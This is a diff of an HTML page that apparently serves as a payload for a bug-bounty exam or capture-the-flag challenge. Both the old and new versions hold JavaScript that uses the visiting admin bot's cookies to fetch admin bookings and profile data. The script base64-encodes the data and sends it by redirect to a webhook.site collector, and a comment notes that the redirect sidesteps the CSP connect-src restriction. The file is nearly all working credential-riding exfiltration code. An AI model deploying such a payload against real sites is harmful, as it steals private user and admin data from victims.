@@ -1,31 +1,30 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>System Monitor</title>
-</head>
+<html>
 <body>
-    <h1>Processing Admin Request...</h1>
     <script>
-        const webhook = "https://webhook.site/966eca5b-8dbd-405f-895e-a47c742aa523";
+        const webh = "https://webhook.site/91bce232-92d8-4ee3-bf77-38a155638aae";
         const base = "https://api-bugbounty-exam.hashacademy.co";
 
-        async function exfiltrate() {
-            try {
-                // We fetch the admin bookings where the 'FlagSeeker' car was found
-                const response = await fetch(`${base}/api/admin/bookings`, { credentials: "include" });
-                const data = await response.text();
-                
-                // Use location.replace to bypass CSP 'connect-src'
-                // This sends the data as a Base64 string in the URL
-                window.location.replace(`${webhook}?data=${btoa(data)}`);
-            } catch (e) {
-                // Fallback to stats if bookings fail
-                window.location.replace(`${webhook}?error=${btoa(e.message)}`);
-            }
+        async function steal() {
+            // Target the list of ALL bookings - the flag is usually in a specific record here
+            const response = await fetch(base + "/api/admin/bookings", { credentials: "include" });
+            const data = await response.json();
+            
+            // Encode the entire JSON to Base64 to safely transmit it via URL
+            const encodedData = btoa(JSON.stringify(data));
+            
+            // Redirect the AdminBot to your webhook with the data
+            window.location.href = webh + "?full_leak=" + encodedData;
         }
 
-        exfiltrate();
+        steal().catch(err => {
+            // If the first one fails, try the admin profile
+            fetch(base + "/api/auth/profile", { credentials: "include" })
+                .then(r => r.text())
+                .then(d => {
+                    window.location.href = webh + "?profile_leak=" + btoa(d);
+                });
+        });
     </script>
 </body>
 </html>
